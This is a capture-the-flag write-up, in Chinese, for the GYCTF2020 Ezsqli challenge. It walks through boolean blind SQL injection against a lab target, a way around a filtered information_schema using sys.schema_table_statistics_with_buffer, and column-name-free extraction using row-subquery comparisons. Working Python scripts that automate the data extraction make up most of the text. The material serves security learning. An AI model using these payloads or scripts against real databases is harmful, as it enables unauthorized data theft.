# \[GYCTF2020]Ezsqli

## \[GYCTF2020]Ezsqli

## 考点

* 布尔盲注
* `sys.schema_table_statistics_with_buffer` bypass information\_schema
* 无列名注入

## wp

POST 参数 id 存在数字注入，POST id=0^1 返回正常，POST id= 0^0 返回 Error\
POST id=0^(ascii(substr((select%20database()),1,1))>0) 返回正常

用脚本可以跑出数据库名

```python
import requests

url = 'http://07fb8bbc-8905-4e86-aa75-150e999cc025.node3.buuoj.cn/index.php'

# 0^1返回 Nu1L
# 0^0返回 Error Occured When Fetch Result

# give_grandpa_pa_pa_pa
def get_database():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            payload = f"0^(ascii(substr((select database()),{i},1))>{mid})#"
            
            data = {
                'id': payload
            }
            
            r = requests.post(url=url, data=data)
            # print(r.text)
            if 'Nu1L' in  r.text:
                low = mid + 1
            if 'Error' in r.text:
                high = mid
                
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
```

过滤了information\_schema，可以使用`sys.schema_table_statistics_with_buffer`获取表名\
`select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()`

脚本如下

```python
# users233333333333333,f1ag_1s_h3r3_hhhhh
def get_table():
    flag = ''
    for i in range(1, 100):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            payload = f"0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{i},1))>{mid})"
            
            data = {
                'id': payload
            }
            
            r = requests.post(url=url, data=data)
            # print(r.text)
            if 'Nu1L' in  r.text:
                low = mid + 1
            if 'Error' in r.text:
                high = mid
                
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
```

不难猜flag在 f1ag\_1s\_h3r3\_hhhhh 剩下的就是无列名注入\
先判断一下f1ag\_1s\_h3r3\_hhhhh有几列，但是这里过滤了 union select 和 order by\
MySQL官方给了一种方法，https://dev.mysql.com/doc/refman/8.0/en/row-subqueries.html

SELECT \* FROM users WHERE (1) = (SELECT \* FROM flag\_123 LIMIT 0,1)\
这个语句可以正常返回，其中 users 有 3 列，flag\_123 只有 1 列，通过改变 WHERE 子句后的 1 的个数可以判断 flag\_123 的列数\
SELECT \* FROM users WHERE (1,2) = (SELECT \* FROM flag\_123 LIMIT 0,1) 该语句会返回错误

回到本题，其后端查询语句不难猜到为\
SELECT \* FROM users WHERE id = 1\
结合上面的内容可以改为\
SELECT \* FROM users WHERE id = 1 ^ ((1)=(select \* from f1ag\_1s\_h3r3\_hhhhh)) 如果返回错误说明不只有 1 列\
实际上，1 ^ ((1,2)=(select \* from f1ag\_1s\_h3r3\_hhhhh)) 是返回正确的，说明 f1ag\_1s\_h3r3\_hhhhh 有两列

SELECT \* FROM users WHERE id = 1 ^ (('0',2)<(select \* from f1ag\_1s\_h3r3\_hhhhh))\
按照理论来说，这个应该返回 Error，实际和理论相同\
SELECT \* FROM users WHERE id = 1 ^ (('0',2)>(select \* from f1ag\_1s\_h3r3\_hhhhh))\
按照理论来说，这个应该返回 Nu1L，实际和理论相同

所以可以对这两个位置进行字符串的爆破来查看flag，也可以通过第一个字符进行判断\
0 ^ (('g',2)>(select \* from f1ag\_1s\_h3r3\_hhhhh)) 返回 Error 说明第一列第一个字符以 f 开头\
0 ^ ((1,'g')>(select \* from f1ag\_1s\_h3r3\_hhhhh)) 返回 Nu1L\
0 ^ ((1,'f')>(select \* from f1ag\_1s\_h3r3\_hhhhh)) 返回 Error\
说明第二列第一个字符以 f 开头

这里有个地方需要注意，在 MySQL 中 `SELECT((SELECT 'G')>(SELECT 'f'))` 返回 1，但是实际上 G 的ASCII小于 f 的， SELECT((SELECT 'E')>(SELECT 'f')) 返回 0，所以这里在脚本里面进行了设置编码表，并且<mark style="background-color:red;">这里无法判断大小写</mark>

```python
import requests

url = 'http://07fb8bbc-8905-4e86-aa75-150e999cc025.node3.buuoj.cn/index.php'

# 0^1返回 Nu1L
# 0^0返回 Error Occured When Fetch Result

# give_grandpa_pa_pa_pa
def get_database():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            payload = f"0^(ascii(substr((select database()),{i},1))>{mid})"
            
            data = {
                'id': payload
            }
            
            r = requests.post(url=url, data=data)
            # print(r.text)
            if 'Nu1L' in  r.text:
                low = mid + 1
            if 'Error' in r.text:
                high = mid
                
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break

# users233333333333333,f1ag_1s_h3r3_hhhhh
def get_table():
    flag = ''
    for i in range(1, 100):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            payload = f"0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{i},1))>{mid})"
            
            data = {
                'id': payload
            }
            
            r = requests.post(url=url, data=data)
            # print(r.text)
            if 'Nu1L' in  r.text:
                low = mid + 1
            if 'Error' in r.text:
                high = mid
                
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break

def get_version():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            payload = f"0^(ascii(substr((SELECT VERSION()),{i},1))>{mid})"
            
            data = {
                'id': payload
            }
            
            r = requests.post(url=url, data=data)
            # print(r.text)
            if 'Nu1L' in  r.text:
                low = mid + 1
            if 'Error' in r.text:
                high = mid
                
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break


def get_flag():
    table = [',','-','0','1','2','3','4','5','6','7','8','9','_','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','{','}']
    flag = ''
    for i in range(1, 100):
        low = 0
        high = 41
        mid = (low+high)//2
        print(flag)
        
        while low < high:
            single_char = table[mid]
            
            tmp = flag + single_char
            
            payload = f"0 ^ ((1,'{tmp}')>(select * from f1ag_1s_h3r3_hhhhh))"
            data = {
                'id': payload
            }
            
            r = requests.post(url=url, data=data)
            # print(r.text)
            if 'Error' in  r.text:
                low = mid + 1
            if 'Nu1L' in r.text:
                high = mid
   
            mid = (low+high)//2

            
            if low == high:
                flag = flag + table[mid-1]
                break
get_flag()
```
